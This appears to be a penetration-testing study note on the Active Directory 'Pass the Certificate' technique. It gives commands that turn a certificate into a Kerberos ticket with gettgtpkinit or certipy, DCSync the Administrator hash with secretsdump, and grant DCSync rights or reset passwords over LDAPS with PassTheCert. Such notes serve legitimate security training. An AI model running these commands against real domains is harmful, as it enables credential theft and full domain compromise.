---
tool: Pass the Certificate
slug: pass-the-certificate
kind: technique
stages: [post-compromise]
targets: [windows]
category: Turning an X.509 certificate into a Kerberos TGT
platforms: [linux]
services: [kerberos, ldap]
ports: [88, 636]
tags: [active directory, kerberos, pkinit, adcs, certificates, pass-the-ticket]
attack: [T1550.003, T1649, T1558]
summary: PKINIT lets Kerberos authenticate with a certificate instead of a password, so any X.509 certificate for an account — minted from an AD CS misconfiguration, an ESC8 relay or a Shadow Credential — can be exchanged for that account's TGT. Once you hold the ticket you are back in Pass-the-Ticket territory: DCSync, Evil-WinRM, the lot.
references:
  - PKINITtools | https://github.com/dirkjanm/PKINITtools
  - SpecterOps — Certified Pre-Owned | https://posts.specterops.io/certified-pre-owned-d95910965cd2
---

## When to reach for it

You have a certificate (a `.pfx`/PKCS#12, often with its password) for a domain account and want to authenticate as it. Certificates turn up from AD CS template abuse ([Certipy](/cpts/#tool-certipy) / [Certify](/cpts/#tool-certify)), from an ESC8 [NTLM relay](/cpts/#tool-ntlm-relay) to the web-enrolment endpoint, or from a [Shadow Credential](/cpts/#tool-shadow-credentials) you wrote yourself. PKINIT exchanges that certificate for a TGT — no password needed, and certificates survive password resets, which makes this strong for persistence too.

## Key tools and flags

- `gettgtpkinit.py` (PKINITtools): `-cert-pfx file.pfx -pfx-pass PASS DOMAIN/user /tmp/user.ccache` — request a TGT from a certificate.
- `certipy auth -pfx file.pfx -dc-ip TARGET` does the same from the Certipy toolkit, and also recovers the NT hash via U2U.
- `export KRB5CCNAME=/tmp/user.ccache` then use any `-k` tool (see [Pass the Ticket (Linux)](/cpts/#tool-linux-ticket-abuse)).
- The AS-REP encryption key printed by `gettgtpkinit` is needed by `getnthash.py` if you want the NT hash out of the ticket.

## Commands

Request a TGT from a PFX (e.g. a relayed DC machine-account cert):

```bash
python3 gettgtpkinit.py -cert-pfx DC01\$.pfx -dc-ip TARGET 'DOMAIN/dc01$' /tmp/dc.ccache
```

Pass the ticket — DCSync the domain as the DC machine account:

```bash
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip TARGET -just-dc-user Administrator 'DOMAIN/DC01$'@dc01.DOMAIN
```

When PKINIT is unavailable (KDC lacks the right EKU), authenticate to LDAPS with the cert instead:

```bash
# PassTheCert: e.g. grant yourself DCSync or reset a password over LDAPS
python3 passthecert.py -action ... -crt cert.crt -key cert.key -domain DOMAIN -dc-ip TARGET
```

## Workflow

1. Obtain a certificate: AD CS abuse, an ESC8 relay, or a Shadow Credential write.
2. Run `gettgtpkinit.py` (or `certipy auth`) to turn the PFX into a `.ccache` TGT.
3. `export KRB5CCNAME` and confirm with `klist`.
4. Act as the account — DCSync with [secretsdump](/cpts/#tool-secretsdump), a shell with [Evil-WinRM](/cpts/#tool-evil-winrm) `-r`, or anything `-k`-aware.
5. If PKINIT fails on EKU grounds, fall back to **PassTheCert** over LDAPS to change a password or grant DCSync rights.

## Notes

If `gettgtpkinit` throws "Error detecting the version of libcrypto", reinstall the `oscrypto` library from its git source. A relayed machine-account certificate (DC01$) is the high-impact case: its TGT DCSyncs the whole domain. Clock skew still applies — keep your host within five minutes of the DC. For producing the certificate in the first place, see the AD CS notes; this note is only the cert-to-ticket step. PassTheCert's LDAPS path is the escape hatch when the DC won't accept the cert for PKINIT pre-authentication.
